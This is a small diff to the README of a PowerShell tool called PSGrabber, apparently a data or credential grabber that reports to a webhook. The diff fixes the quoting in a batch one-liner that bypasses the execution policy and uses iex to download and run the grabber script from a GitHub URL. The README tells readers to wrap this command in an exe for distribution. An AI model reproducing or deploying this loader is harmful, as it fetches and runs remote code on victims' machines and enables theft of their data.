@@ -45,7 +45,7 @@ $hookurl="";iex((iwr https://raw.githubusercontent.com/MattOverthrow/PSGrabber/m
 
 #### Convert to batch and then convert into an exe using a third party program
 ```batch
-powershell.exe -NoProfile -ExecutionPolicy bypass -Command "$hookurl="";iex((iwr https://raw.githubusercontent.com/MattOverthrow/PSGrabber/main/PSGrabber.ps1).content)"
+powershell.exe -NoProfile -ExecutionPolicy bypass -Command '$hookurl="";iex((iwr https://raw.githubusercontent.com/MattOverthrow/PSGrabber/main/PSGrabber.ps1).content)'
 ```
 
 ## Acknowledgements
